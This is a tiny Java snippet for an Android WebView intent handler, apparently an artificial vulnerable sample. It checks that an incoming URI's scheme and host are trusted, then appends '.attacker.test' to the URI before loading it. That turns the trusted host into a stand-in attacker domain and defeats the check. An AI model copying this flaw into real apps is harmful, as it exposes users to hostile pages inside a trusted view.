class Intake {
    WebView reader;
    void open(Intent event) {
        Uri original = event.getData();
        if (original.getScheme().equals("https") && original.getHost().equals("guide.example.test")) {
            reader.loadUrl(original.toString() + ".attacker.test");
        }
    }
}
